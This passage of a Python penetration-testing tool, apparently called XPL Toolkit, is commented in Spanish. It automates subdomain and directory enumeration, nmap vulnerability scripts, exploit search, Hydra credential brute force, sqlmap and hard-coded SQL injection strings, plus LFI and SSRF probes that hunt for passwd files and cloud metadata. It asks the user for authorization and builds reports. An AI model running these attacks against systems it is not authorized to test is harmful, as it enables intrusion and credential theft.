    """Combina múltiples wordlists, opcionalmente elimina duplicados."""
    words = []
    for fpath in file_list:
        if os.path.exists(fpath):
            with open(fpath) as f:
                words.extend(l.strip() for l in f if l.strip())

    if dedup:
        words = list(dict.fromkeys(words))  # mantiene orden

    with open(output_path, "w") as f:
        f.write("\n".join(words) + "\n")
    print(f"  {cc('Wordlist combinada:', Colors.GREEN)} {output_path} ({len(words)} entradas)")
    return output_path


# =============================================================================
#  RECONOCIMIENTO WEB
# =============================================================================

def web_recon(target, session_dir):
    """Reconocimiento web completo con paralelización."""
    step_info(3, "Reconocimiento Web")

    results = {}
    live = []

    # Subdominios (paralelo)
    subdomains_file = os.path.join(session_dir, "assets/subdomains.txt")
    print(f"  {cc('[1/4]', Colors.CYAN)} Enumeración de subdominios...", end=" ")
    subs = []
    if tool_installed("subfinder"):
        try:
            subprocess.run(
                ["subfinder", "-d", target, "-o", subdomains_file, "-silent"],
                capture_output=True, text=True, timeout=120
            )
            if os.path.exists(subdomains_file):
                with open(subdomains_file) as f:
                    subs = [l.strip() for l in f if l.strip()]
        except Exception:
            pass
    if not subs:
        subs = [target]
        with open(subdomains_file, "w") as f:
            f.write(f"https://{target}\nhttp://{target}\n")
    print(cc(f"{len(subs)} subdominios", Colors.GREEN))

    # Probing con httpx (paralelo)
    httpx_file = os.path.join(session_dir, "assets/httpx_results.txt")
    print(f"  {cc('[2/4]', Colors.CYAN)} Probing HTTP/HTTPS...", end=" ")
    if tool_installed("httpx"):
        try:
            subprocess.run(
                ["httpx", "-l", subdomains_file, "-title", "-status-code",
                 "-tech-detect", "-silent", "-o", httpx_file],
                capture_output=True, text=True, timeout=120
            )
            if os.path.exists(httpx_file):
                with open(httpx_file) as f:
                    live = [l.strip() for l in f if l.strip()]
                print(cc(f"{len(live)} URLs activas", Colors.GREEN))
            else:
                print(cc("sin resultados", Colors.YELLOW))
        except Exception:
            print(cc("error", Colors.RED))
    else:
        print(cc("httpx no disponible", Colors.YELLOW))

    # Detección de tecnología
    print(f"  {cc('[3/4]', Colors.CYAN)} Detección de tecnología...", end=" ")
    tech = detect_web_technology(target)
    print(cc(f"{'OK' if tech else 'sin resultados'}", Colors.GREEN if tech else Colors.YELLOW))

    # Directory brute force con gobuster
    print(f"  {cc('[4/4]', Colors.CYAN)} Directorios comunes...", end=" ")
    dirs_found = []
    if tool_installed("gobuster"):
        try:
            wl = WORDLISTS.get("web_common", "")
            result = subprocess.run(
                ["gobuster", "dir", "-u", f"https://{target}",
                 "-w", wl, "-t", "20", "-q",
                 "--exclude-length", "0"],
                capture_output=True, text=True, timeout=120
            )
            dirs_found = [l.strip() for l in result.stdout.strip().split('\n')
                          if l.strip() and '/' in l]
            print(cc(f"{len(dirs_found)} directorios", Colors.GREEN))
        except Exception:
            print(cc("error", Colors.RED))
    else:
        print(cc("gobuster no disponible", Colors.YELLOW))

    results = {
        "subdomains": len(subs),
        "live_urls": len(live) if os.path.exists(httpx_file) else 0,
        "technology": tech or "N/A",
        "directories": len(dirs_found),
    }

    log_to_session(session_dir, "Web recon", json.dumps(results))
    return results


def detect_web_technology(target):
    try:
        if tool_installed("httpx"):
            result = subprocess.run(
                ["httpx", "-u", f"https://{target}", "-td", "-silent"],
                capture_output=True, text=True, timeout=15
            )
            if result.stdout.strip():
                return result.stdout.strip()
    except Exception:
        pass
    try:
        req = urllib.request.Request(f"https://{target}", headers={"User-Agent": "XPL-Toolkit/2.0"})
        with urllib.request.urlopen(req, timeout=8) as resp:
            h = dict(resp.headers)
            techs = []
            if h.get("Server"): techs.append(f"Server: {h['Server']}")
            if h.get("X-Powered-By"): techs.append(f"Powered: {h['X-Powered-By']}")
            return " | ".join(techs) if techs else None
    except Exception:
        return None


# =============================================================================
#  VERIFICACIÓN CON NMAP
# =============================================================================

def verify_vulnerability(target, session_dir, service="general"):
    """Verificación de vulnerabilidades con Nmap."""
    step_info(4, "Verificación de Vulnerabilidad (Nmap)")

    if not tool_installed("nmap"):
        warn("nmap no disponible.")
        return ""

    scripts = NMAP_SCRIPTS.get(service, NMAP_SCRIPTS["general"])
    info(f"Scripts: {scripts}")

    nmap_output_file = os.path.join(session_dir, "assets/nmap_verify.txt")
    cmd = ["nmap", "-sV", "-Pn", f"--script={scripts}", "--script-timeout=30s", target]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        output = result.stdout + result.stderr
        with open(nmap_output_file, "w") as f:
            f.write(output)

        vulns = re.findall(r'VULNERABLE|CVE-|CRITICAL|HIGH|Vulnerability', output)
        if vulns:
            success(f"{len(vulns)} hallazgos potenciales")
            for line in output.split('\n'):
                if any(kw in line for kw in ["VULNERABLE", "CVE-", "state:", "Vulnerability", "|_"]):
                    print(f"      {line.strip()}")
        else:
            info("Sin vulnerabilidades evidentes.")

        log_to_session(session_dir, f"Nmap verify ({service})", f"{len(vulns)} hallazgos")
        return output
    except subprocess.TimeoutExpired:
        error("Nmap timeout (300s)")
        return ""
    except Exception as e:
        error(f"Nmap error: {e}")
        return ""


# =============================================================================
#  BÚSQUEDA DE EXPLOITS (searchsploit)
# =============================================================================

def search_exploits(service, version=None):
    step_info(5, "Búsqueda de Exploits (ExploitDB)")

    if not tool_installed("searchsploit"):
        warn("searchsploit no disponible.")
        return []

    query = f"{service} {version}" if version else service
    info(f"Buscando: {query}")

    try:
        result = subprocess.run(
            ["searchsploit", query, "--disable-colour", "--exclude", "DOS"],
            capture_output=True, text=True, timeout=30
        )
        exploits = []
        for line in result.stdout.strip().split('\n'):
            if "|" in line and any(k in line.lower() for k in ["remote", "local", "webapps", "exploit"]):
                parts = [p.strip() for p in line.split("|") if p.strip()]
                if len(parts) >= 2:
                    exploits.append({"path": parts[0], "title": parts[1]})

        if exploits:
            success(f"{len(exploits)} exploits encontrados")
            for i, ex in enumerate(exploits[:25], 1):
                print(f"      {i}. {ex['title']}")
        else:
            info("Sin exploits encontrados.")

        return exploits
    except Exception as e:
        error(f"searchsploit: {e}")
        return []


# =============================================================================
#  FUERZA BRUTA
# =============================================================================

def brute_force(target, service, session_dir, custom_users=None, custom_pass=None):
    step_info(6, "Fuerza Bruta (Hydra)")

    if not tool_installed("hydra"):
        warn("hydra no disponible.")
        return None

    users_wl = custom_users or WORDLISTS.get("ssh_users", "")
    pass_wl = custom_pass or WORDLISTS.get("ssh_pass", "")

    # Si no existen las wordlists de la skill, usar defaults
    if not os.path.exists(users_wl):
        users_wl = os.path.join(WORDLISTS_DIR, "fast_track_users.txt")
    if not os.path.exists(pass_wl):
        pass_wl = os.path.join(WORDLISTS_DIR, "fast_track_pass.txt")

    output_file = os.path.join(session_dir, "assets/hydra_output.txt")
    cmd = ["hydra", "-L", users_wl, "-P", pass_wl, target, service,
           "-t", "8", "-f", "-V", "-o", output_file]

    info(f"Hydra: -L {os.path.basename(users_wl)} -P {os.path.basename(pass_wl)} {target} {service}")
    print(f"  Iniciando ataque (hasta 600s)...", end=" ")

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        output = result.stdout + result.stderr
        with open(output_file, "w") as f:
            f.write(output)

        creds = re.findall(r'login: (\S+)\s+password: (\S+)', output)
        if creds:
            print(cc(f"{len(creds)} credenciales", Colors.GREEN))
            for user, passwd in creds:
                print(f"      {cc(user, Colors.CYAN)} : {cc(passwd, Colors.YELLOW)}")
            log_to_session(session_dir, f"Brute {service}", "SUCCESS")
        else:
            print(cc("sin resultados", Colors.YELLOW))
            log_to_session(session_dir, f"Brute {service}", "No results")

        return output
    except subprocess.TimeoutExpired:
        warn("Hydra timeout (600s)")
        return ""
    except Exception as e:
        error(f"Hydra: {e}")
        return ""


# =============================================================================
#  EXPLOITS ADICIONALES (LFI, RFI, XXE, SSRF, Deserialization)
# =============================================================================

def test_lfi(target, session_dir):
    """Prueba Local File Inclusion."""
    step_info(7, "Prueba de Exploit: LFI")
    cfg = ADDITIONAL_EXPLOITS["lfi"]
    info(f"Probiendo {len(cfg['payloads'])} payloads de LFI")

    found = []
    base_url = f"https://{target}"

    for param in cfg["test_params"][:5]:
        for payload in cfg["payloads"][:3]:
            url = f"{base_url}?{param}={payload}"
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "XPL-Toolkit/2.0"})
                with urllib.request.urlopen(req, timeout=5) as resp:
                    body = resp.read(2000).decode("utf-8", errors="replace")
                    if "root:" in body or "daemon:" in body or "passwd" in body:
                        found.append({"url": url, "indicator": "passwd content"})
            except Exception:
                pass

    if found:
        success(f"LFI detectado en {len(found)} caso(s)")
        for f in found:
            print(f"      {f['url']} → {f['indicator']}")
    else:
        info("LFI no detectado.")

    return found


def test_sqli(target, session_dir):
    """Prueba SQL Injection básica."""
    step_info(7, "Prueba de Exploit: SQLi")

    if not tool_installed("sqlmap"):
        warn("sqlmap no disponible. Usando prueba básica...")
        return test_sqli_basic(target)

    info("Ejecutando sqlmap con detección automática...")
    output_file = os.path.join(session_dir, "assets/sqlmap_output.txt")
    cmd = ["sqlmap", "-u", f"https://{target}", "--batch", "--risk=3", "--level=3",
           "--dbs", "--random-agent", "--flush-session"]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        output = result.stdout + result.stderr
        with open(output_file, "w") as f:
            f.write(output)

        if "is vulnerable" in output or "available databases" in output:
            success("SQLi confirmada")
            for line in output.split('\n'):
                if "vulnerable" in line.lower() or "database" in line.lower() or "sql injection" in line.lower():
                    print(f"      {line.strip()}")
        else:
            info("SQLi no detectada.")

        return output
    except Exception as e:
        error(f"SQLMap: {e}")
        return ""

def test_sqli_basic(target):
    """SQLi básica sin sqlmap."""
    payloads = [
        "' OR '1'='1", "' OR 1=1--", "1' AND 1=1--",
        "1' AND 1=2--", "' UNION SELECT NULL--",
        "1' ORDER BY 1--", "1' ORDER BY 10--",
    ]
    found = []
    for p in payloads:
        url = f"https://{target}?id={urllib.parse.quote(p)}"
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "XPL-Toolkit/2.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read(2000).decode("utf-8", errors="replace")
                status = resp.status
                if status == 500 or "sql" in body.lower() or "syntax" in body.lower():
                    found.append({"payload": p, "status": status})
        except Exception:
            pass
    return found


def test_xxe(target, session_dir):
    """Prueba XML External Entity."""
    step_info(7, "Prueba de Exploit: XXE")
    info("XXE requiere un endpoint XML y un servidor de escucha. Modo pasivo.")
    info("Payloads disponibles:")
    for i, p in enumerate(ADDITIONAL_EXPLOITS["xxe"]["payloads"], 1):
        print(f"      {i}. {p[:80]}...")
    info("Requiere endpoint XML + listener para confirmación.")
    return None


def test_ssrf(target, session_dir):
    """Prueba Server-Side Request Forgery."""
    step_info(7, "Prueba de Exploit: SSRF")
    cfg = ADDITIONAL_EXPLOITS["ssrf"]
    info(f"Probiendo {len(cfg['payloads'])} payloads SSRF")

    found = []
    for param in cfg["test_params"][:4]:
        for payload in cfg["payloads"][:3]:
            url = f"https://{target}?{param}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "XPL-Toolkit/2.0"})
                with urllib.request.urlopen(req, timeout=5) as resp:
                    body = resp.read(2000).decode("utf-8", errors="replace")
                    if "root:" in body or "AWS" in body or "meta-data" in body:
                        found.append({"url": url, "indicator": "internal data"})
            except Exception:
                pass

    if found:
        success(f"SSRF detectado en {len(found)} caso(s)")
    else:
        info("SSRF no detectado.")
    return found


def test_deserialization(target, session_dir):
    """Prueba Insecure Deserialization."""
    step_info(7, "Prueba de Exploit: Deserialization")
    cfg = ADDITIONAL_EXPLOITS["deserialization"]["payloads"]
    info("Verificación pasiva de deserialization:")
    for lang, info_payload in cfg.items():
        print(f"      {cc(lang.upper(), Colors.CYAN)}: marker={info_payload['check']} → {info_payload['description']}")
    info("Requiere endpoint que acepte datos serializados para confirmación activa.")
    return None


# =============================================================================
#  REPORTE AVANZADO (HTML con gráficos)
# =============================================================================

def generate_report(target, vuln, session_dir, status, cve_results=None,
                    services=None, waf=None, tls_info=None, raw_output="",
                    auth_mode="", tools_used=""):
    """Genera reporte HTML con gráficos."""
    section("Reporte y Documentación")

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    report_dir = os.path.join(session_dir, "assets")
    os.makedirs(report_dir, exist_ok=True)

    # ── Reporte HTML ──
    html = generate_html_report(
        target=target, vulnerability=vuln, status=status,
        cve_results=cve_results or [], services=services or [],
        waf=waf, tls_info=tls_info, timestamp=timestamp,
        auth_mode=auth_mode, tools_used=tools_used
    )
    html_path = os.path.join(report_dir, f"report_{Security.sanitize(vuln)}.html")
    with open(html_path, "w", encoding="utf-8") as f:
        f.write(html)
    success(f"Reporte HTML: {html_path}")

    # ── Reporte Markdown (fallback) ──
    md = generate_md_report(
        target=target, vulnerability=vuln, status=status,
        cve_results=cve_results or [], services=services or [],
        timestamp=timestamp, auth_mode=auth_mode, raw_output=raw_output
    )
    md_path = os.path.join(report_dir, f"exploit_{Security.sanitize(vuln)}.md")
    with open(md_path, "w", encoding="utf-8") as f:
        f.write(md)
    success(f"Reporte Markdown: {md_path}")

    log_to_session(session_dir, "Report generated", f"HTML + MD")
    update_session_status(session_dir, "COMPLETED")

    return html_path, md_path


def generate_html_report(target, vulnerability, status, cve_results, services,
                         waf, tls_info, timestamp, auth_mode, tools_used):
    """Genera un reporte HTML completo con gráficos."""
    # Todos los valores externos se escapan antes de insertarlos en HTML.
    esc_target = html_escape(str(target), quote=True)
    esc_vulnerability = html_escape(str(vulnerability), quote=True)
    esc_status = html_escape(str(status), quote=True)
    esc_timestamp = html_escape(str(timestamp), quote=True)
    esc_auth_mode = html_escape(str(auth_mode), quote=True)
    esc_tools_used = html_escape(str(tools_used), quote=True)

    try:
        import plotly.graph_objects as go
        import plotly.utils
        # Gráfico de severidad
        if cve_results:
            sev_counts = {}
            for r in cve_results:
                s = (r["severity"] or "UNKNOWN").upper()
                sev_counts[s] = sev_counts.get(s, 0) + 1

            fig = go.Figure(data=[go.Pie(
                labels=list(sev_counts.keys()),
                values=list(sev_counts.values()),
                hole=0.4,
                marker=dict(colors=["#ef4444", "#f59e0b", "#eab308", "#22c55e", "#6b7280"])
            )])
            fig.update_layout(
                title="Distribución de Severidad CVE",
                font=dict(family="monospace", size=12),
                template="plotly_dark",
                height=350, width=450,
                margin=dict(t=40, b=20, l=20, r=20),
            )
            severity_chart = json.dumps(fig, cls=plotly.utils.PlotlyJSONEncoder)
        else:
            severity_chart = None
    except ImportError:
        severity_chart = None

    # ── HTML ──
    html = f"""<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>XPL Report — {esc_target}</title>
<style>
  :root {{ --bg: #0f172a; --card: #1e293b; --text: #e2e8f0; --accent: #38bdf8; --red: #ef4444; --green: #22c55e; --yellow: #eab308; }}
  * {{ margin: 0; padding: 0; box-sizing: border-box; }}
  body {{ font-family: 'Segoe UI', system-ui, sans-serif; background: var(--bg); color: var(--text); padding: 2rem; line-height: 1.6; }}
  h1 {{ color: var(--accent); font-size: 2rem; margin-bottom: 0.5rem; }}
  h2 {{ color: var(--accent); font-size: 1.4rem; margin: 2rem 0 1rem; border-bottom: 1px solid #334155; padding-bottom: 0.3rem; }}
  .card {{ background: var(--card); border-radius: 8px; padding: 1.5rem; margin: 1rem 0; border: 1px solid #334155; }}
  .grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1rem; }}
  .stat {{ text-align: center; }}
  .stat-num {{ font-size: 2.5rem; font-weight: bold; color: var(--accent); }}
  .stat-label {{ font-size: 0.85rem; color: #94a3b8; text-transform: uppercase; }}
  table {{ width: 100%; border-collapse: collapse; margin: 1rem 0; }}
  th, td {{ padding: 0.6rem; text-align: left; border-bottom: 1px solid #334155; font-size: 0.9rem; }}
  th {{ background: #0f172a; color: var(--accent); }}
  .sev-CRITICAL {{ color: var(--red); font-weight: bold; }}
  .sev-HIGH {{ color: #f97316; font-weight: bold; }}
  .sev-MEDIUM {{ color: var(--yellow); }}
  .sev-LOW {{ color: var(--green); }}
  .badge {{ display: inline-block; padding: 0.2rem 0.6rem; border-radius: 4px; font-size: 0.8rem; font-weight: bold; }}
  .badge-success {{ background: #065f46; color: #6ee7b7; }}
  .badge-warning {{ background: #92400e; color: #fde68a; }}
  .badge-danger {{ background: #991b1b; color: #fca5a5; }}
  pre {{ background: #0f172a; padding: 1rem; border-radius: 6px; overflow-x: auto; font-size: 0.85rem; max-height: 300px; overflow-y: auto; }}
  .footer {{ margin-top: 3rem; text-align: center; color: #64748b; font-size: 0.8rem; }}
</style>
</head>
<body>

<h1>🛡️ XPL Toolkit Report</h1>
<p style="color:#94a3b8">Target: <strong>{esc_target}</strong> | Vulnerability: <strong>{esc_vulnerability}</strong> | Date: {esc_timestamp}</p>

<div class="card">
  <div class="grid">
    <div class="stat"><div class="stat-num">{len(cve_results)}</div><div class="stat-label">CVEs Found</div></div>
    <div class="stat"><div class="stat-num">{len(services)}</div><div class="stat-label">Services</div></div>
    <div class="stat"><div class="stat-num">{len(waf) if waf else 0}</div><div class="stat-label">WAF Detected</div></div>
    <div class="stat"><div class="stat-num">{len(tls_info.get('supported', [])) if tls_info else 0}</div><div class="stat-label">TLS Versions</div></div>
  </div>
</div>

<h2>Executive Summary</h2>
<div class="card">
  <p><strong>Target:</strong> {esc_target}</p>
  <p><strong>Vulnerability:</strong> {esc_vulnerability}</p>
  <p><strong>Status:</strong> <span class="badge badge-{'success' if status=='SUCCESS' else 'warning'}">{esc_status}</span></p>
  <p><strong>Auth Mode:</strong> {esc_auth_mode}</p>
  <p><strong>Tools:</strong> {esc_tools_used}</p>
</div>

"""

    # Servicios
    if services:
        html += "<h2>Detected Services</h2>\n<div class='card'>\n"
        html += "<table><tr><th>Port</th><th>Service</th><th>Version</th></tr>\n"
        for s in services:
            html += (
                f"<tr><td>{html_escape(str(s.get('port', 'N/A')), quote=True)}/tcp</td>"
                f"<td>{html_escape(str(s.get('service', 'N/A')), quote=True)}</td>"
                f"<td>{html_escape(str(s.get('version', 'N/A')), quote=True)}</td></tr>\n"
            )
        html += "</table>\n</div>\n"

    # WAF
    if waf:
        waf_text = html_escape(', '.join(map(str, waf)), quote=True)
        html += f"<h2>WAF Detection</h2>\n<div class='card'><p>WAFs detected: <strong>{waf_text}</strong></p></div>\n"

    # TLS
    if tls_info and tls_info.get("supported"):
        html += "<h2>SSL/TLS Analysis</h2>\n<div class='card'>\n"
        supported = html_escape(', '.join(map(str, tls_info['supported'])), quote=True)
        html += f"<p>Supported versions: {supported}</p>\n"
        cert = tls_info.get("certificate", {})
        if cert:
            subject = html_escape(str(cert.get('subject', {})), quote=True)
            issuer = html_escape(str(cert.get('issuer', {})), quote=True)
            not_after = html_escape(str(cert.get('not_after', 'N/A')), quote=True)
            html += f"<p>Certificate Subject: {subject}</p>\n"
            html += f"<p>Issuer: {issuer}</p>\n"
            html += f"<p>Expires: {not_after}</p>\n"
        if tls_info.get("warnings"):
            html += "<p style='color:#f97316'>Warnings:</p><ul>"
            for w in tls_info["warnings"]:
                html += f"<li>{html_escape(str(w), quote=True)}</li>"
            html += "</ul>"
        html += "</div>\n"

    # CVEs
    if cve_results:
        html += "<h2>CVE Results</h2>\n<div class='card'>\n"
        html += "<table><tr><th>CVE ID</th><th>Severity</th><th>CVSS</th><th>Date</th><th>Description</th></tr>\n"
        for r in cve_results[:50]:
            sev = str(r.get("severity", "N/A") or "N/A").upper()
            sev_class = re.sub(r"[^A-Z]", "", sev) or "UNKNOWN"
            score = f"{r['cvss_score']:.1f}" if r.get("cvss_score") is not None else "N/A"
            desc_raw = str(r.get("description", ""))
            desc = (desc_raw[:80] + "...") if len(desc_raw) > 80 else desc_raw
            cve_id = html_escape(str(r.get("cve_id", "N/A")), quote=True)
            published = html_escape(str(r.get("published", ""))[:10], quote=True)
            html += (
                f"<tr><td>{cve_id}</td><td class='sev-{sev_class}'>"
                f"{html_escape(sev, quote=True)}</td><td>{score}</td>"
                f"<td>{published}</td><td>{html_escape(desc, quote=True)}</td></tr>\n"
            )
        html += "</table>\n</div>\n"

        # Gráfico
        if severity_chart:
            html += f"""
<div class="card" style="display:flex;justify-content:center;">
  <div id="severity-chart"></div>
  <script src="https://cdn.plot.ly/plotly-2.27.0.min.js"></script>
  <script>Plotly.newPlot('severity-chart', {severity_chart}.data, {severity_chart}.layout);</script>
</div>
"""

    html += """
<div class="footer">
  <p>Generated by XPL Toolkit v""" + html_escape(VERSION, quote=True) + """ — """ + html_escape(str(timestamp), quote=True) + """</p>
</div>
</body>
</html>"""

    return html


def generate_md_report(target, vulnerability, status, cve_results, services,
                       timestamp, auth_mode, raw_output=""):
    """Genera reporte Markdown básico."""
    md = f"""# Exploit Report: {vulnerability}

- **Target**: {target}
- **Status**: {status}
- **Date**: {timestamp}
- **Mode**: {auth_mode}

## Services Detected

| Port | Service | Version |
| :--- | :--- | :--- |
"""
    for s in services:
        md += f"| {s.get('port', 'N/A')}/tcp | {s.get('service', 'N/A')} | {s.get('version', 'N/A')} |\n"

    md += f"\n## CVE Results ({len(cve_results)} found)\n\n"
    if cve_results:
        md += "| CVE ID | Severity | CVSS | Description |\n| :--- | :--- | :--- | :--- |\n"
        for r in cve_results[:30]:
            score = f"{r['cvss_score']:.1f}" if r.get("cvss_score") is not None else "N/A"
            desc = (r.get("description", "")[:60] + "...") if len(r.get("description", "")) > 60 else r.get("description", "")
            md += f"| {r['cve_id']} | {r.get('severity', 'N/A')} | {score} | {desc} |\n"

    if raw_output:
        md += f"\n## Evidence\n\n```\n{raw_output[:3000]}\n```\n"

    md += "\n## Remediation\n\nConsultar CVEs y aplicar parches correspondientes.\n"
    return md


# =============================================================================
#  FUNCIÓN DE PASO (STEP)
# =============================================================================

def step_info(num, title):
    print(f"\n  {cc(f'[Fase {num}]', Colors.YELLOW)} {cc(title, Colors.BOLD)}")

def info(msg):
    print(f"  {cc('[INFO]', Colors.BLUE)} {msg}")

def warn(msg):
    print(f"  {cc('[WARN]', Colors.YELLOW)} {msg}")
    log_audit("WARNING", "", msg, "warn")

def success(msg):
    print(f"  {cc('[OK]', Colors.GREEN)} {msg}")

def error(msg):
    print(f"  {cc('[ERROR]', Colors.RED)} {msg}")
    log_audit("ERROR", "", msg, "error")


# =============================================================================
#  CONTROL DE AUTORIZACIÓN
# =============================================================================

def request_authorization(target):
    print(f"\n{cc('━'*60, Colors.YELLOW)}")
    print(cc("  ⚠  ADVERTENCIA DE AUTORIZACIÓN  ⚠", Colors.YELLOW))
    print(f"{cc('━'*60, Colors.YELLOW)}")
    print(f"\n  Target: {cc(target, Colors.BOLD)}")
    print(f"\n  La explotación enviará payloads de ataque y puede causar")
    print(f"  interrupción del servicio. Confirma:")
    print(f"\n    1) Authorized pentest — proceed")
    print(f"    2) CTF / Lab environment — proceed")
    print(f"    3) Verify only, don't exploit")
    print(f"    4) Cancel")
    print()
    choice = input(f"  {cc('Tu elección [1-4]:', Colors.YELLOW)} ").strip()
    auth = AUTHORIZATION_CHOICES.get(choice, AUTHORIZATION_CHOICES["4"])
    print(f"  Selección: {cc(auth['label'], Colors.GREEN)}")
    log_audit("AUTHORIZATION", target, auth["label"], "warn" if auth["action"] == "cancel" else "info")
    return auth["action"]


# =============================================================================
#  MODO BATCH (no interactivo)
# =============================================================================

def batch_mode(args):
    """Ejecuta el flujo completo sin interacción (para cron/pipelines)."""
    banner()
    target = args.target
    valid, normalized_target = Security.validate_target(target)
    if not valid:
        error(f"Target '{target}' no es una IP o dominio válido. Operación cancelada.")
        sys.exit(2)
    target = normalized_target
    vuln = args.vulnerability or "general"
    auth_mode = args.batch_auth or "verify"

    log_audit("BATCH_START", target, f"vuln={vuln}, auth={auth_mode}")

    section("MODO BATCH — Ejecución automática")

    # Sesión
    step_info(1, "Gestión de Sesión")
    session_dir = init_session(target)
    info(f"Sesión: {session_dir}")

    # La autorización precede a cualquier acción contra el objetivo.
    if auth_mode == "cancel":
        warn("Batch cancelado.")
        update_session_status(session_dir, "CANCELLED")
        return
    log_to_session(session_dir, "Auth", auth_mode)

    # Herramientas
    available = check_and_install_tools(interactive=False)

    # Servicios
    services = detect_services(target)

    # Detección avanzada
    adv = advanced_detection(target, session_dir)

    # Web recon si aplica
    if vuln in ("web-recon", "http", "https"):
        web_recon(target, session_dir)

    # Verificación Nmap
    mapped = "general"
    if services:
        for s in services:
            if "mapped" in s:
                mapped = s["mapped"]
                break
    nmap_out = verify_vulnerability(target, session_dir, mapped) if auth_mode in ("verify", "full") else ""

    # CVE Lookup
    cve_query = mapped
    if services:
        for s in services:
            if s.get("version"):
                cve_query = f"{s['service']} {s['version']}"
                break
    cve_results = fetch_cves_cached(cve_query, limit=30, min_severity=args.min_severity)
    print_cve_table(cve_results)

    # Reporte
    html, md = generate_report(
        target=target, vuln=vuln, session_dir=session_dir,
        status="VERIFY" if auth_mode == "verify" else "INFO",
        cve_results=cve_results, services=services,
        waf=adv.get("waf"), tls_info=adv.get("tls"),
        raw_output=nmap_out, auth_mode=auth_mode,
        tools_used=", ".join(available[:5])
    )

    section("BATCH COMPLETADO")
    print(f"  Reportes: {html}\n            {md}")
    update_session_status(session_dir, "COMPLETED")
    log_audit("BATCH_COMPLETE", target)


# =============================================================================
#  MODO INTERACTIVO COMPLETO
# =============================================================================

def interactive_mode(args):
    """Modo interactivo mejorado."""
    banner()

    # Target
    target = args.target
    if not target:
        target = input(f"\n  {cc('Objetivo (IP o dominio):', Colors.BOLD)} ").strip()
    if not target:
        error("Sin objetivo. Saliendo.")
        sys.exit(1)

    # Validar antes de crear sesión o ejecutar herramientas.
    valid, normalized_target = Security.validate_target(target)
    if not valid:
        error(f"Target '{target}' no es una IP o dominio válido. Operación cancelada.")
        sys.exit(2)
    target = normalized_target

    # Vulnerabilidad / servicio
    vuln = args.vulnerability
    if not vuln:
        vuln = input(f"  {cc('Vulnerabilidad o servicio:', Colors.BOLD)} ").strip() or "general"

    info(f"Target: {cc(target, Colors.BOLD)} | Prueba: {cc(vuln, Colors.CYAN)}")

    # ── Fase 1: Sesión ──
    step_info(1, "Gestión de Sesión")
    session_dir = init_session(target)
    success(f"Sesión: {session_dir}")

    # Logger
    logger = setup_logging(os.path.join(session_dir, "logs"))
    logger.info(f"XPL Toolkit v{VERSION} started — Target: {target}")

    # ── Autorización ──
    auth_mode = request_authorization(target)
    if auth_mode == "cancel":
        warn("Cancelado.")
        update_session_status(session_dir, "CANCELLED")
        sys.exit(0)
    log_to_session(session_dir, "Auth", auth_mode)

    # ── Herramientas ──
    available = check_and_install_tools()

    # ── Wordlist management ──
    section("Gestión de Wordlists")
    wl_choice = menu("¿Descargar wordlists de SecLists?", {"1": "Descargar SecLists", "2": "Usar wordlists locales", "3": "Combinar wordlists", "4": "Saltar"})
    if wl_choice == "1":
        download_sec_lists()
    elif wl_choice == "3":
        files = input(f"  Archivos (ruta1,ruta2,...): ").strip().split(",")
        out = input(f"  Archivo de salida: ").strip()
        if files and out:
            merge_wordlists(files, out)

    # ── Detección de servicios ──
    services = detect_services(target)

    # ── Detección avanzada ──
    adv_results = advanced_detection(target, session_dir)
    waf = adv_results.get("waf")
    tls_info = adv_results.get("tls")

    # Mapear servicio
    mapped = vuln.lower()
    if mapped not in SERVICE_DETECTION:
        if services:
            for s in services:
                if "mapped" in s:
                    mapped = s["mapped"]
                    break
        else:
            mapped = "general"

    # ── Reconocimiento web ──
    web_data = None
    if vuln in ("web-recon", "http", "https") or any(s.get("mapped") in ("http", "https") for s in services):
        web_data = web_recon(target, session_dir)
    else:
        info("Reconocimiento web saltado.")

    # ── Verificación Nmap ──
    nmap_out = ""
    if auth_mode in ("verify", "full"):
        nmap_out = verify_vulnerability(target, session_dir, mapped)

    # ── CVE Lookup ──
    print(f"\n  {cc('━━━ CVE Lookup ━━━', Colors.CYAN)}")
    cve_query = mapped
    if services:
        for s in services:
            if s.get("version"):
                cve_query = f"{s['service']} {s['version']}"
                break

    print(f"  Query: {cve_query}")
    if confirm("Ejecutar búsqueda CVE?", "s"):
        sev = input(f"  Severidad mínima? (LOW/MEDIUM/HIGH/CRITICAL) [ninguna]: ").strip().upper()
        sev = sev if sev in ("LOW", "MEDIUM", "HIGH", "CRITICAL") else None
        cve_results = fetch_cves_cached(cve_query, limit=30, min_severity=sev)
        print_cve_table(cve_results)

        # Exportar
        if cve_results and confirm("Exportar resultados?", "n"):
            fmt = menu("Formato:", {"1": "JSON", "2": "CSV"})
            out_path = os.path.join(session_dir, "assets", f"cves_{Security.sanitize(cve_query)}.{'json' if fmt == '1' else 'csv'}")
            export_cve_results(cve_results, "json" if fmt == "1" else "csv", out_path)
    else:
        cve_results = []

    # ── Exploits / Fuerza Bruta ──
    exploit_output = ""
    if auth_mode == "full":
        print(f"\n  {cc('━━━ Exploits ━━━', Colors.CYAN)}")

        # Fuerza bruta
        if mapped in ("ssh", "ftp", "mysql", "postgres", "mssql"):
            if confirm(f"Fuerza bruta contra {mapped}?", "n"):
                exploit_output = brute_force(target, mapped, session_dir) or ""

        # Searchsploit
        if confirm("Buscar exploits con searchsploit?", "n"):
            ver = ""
            if services:
                for s in services:
                    if s.get("version"):
                        ver = s["version"]
                        break
            exploits = search_exploits(mapped, ver)

            if exploits and confirm("Ejecutar exploit?", "n"):
                idx = input(f"  Número: ").strip()
                try:
                    idx = int(idx) - 1
                    if 0 <= idx < len(exploits):
                        info(f"Ejecutando: {exploits[idx]['title']}")
                except ValueError:
                    pass

        # Exploits adicionales
        if vuln in ("web-recon", "http", "https"):
            extra_choice = menu("Pruebas adicionales:", {
                "1": "SQL Injection", "2": "LFI/RFI", "3": "XXE",
                "4": "SSRF", "5": "Deserialization", "6": "Saltar"
            })
            if extra_choice == "1":
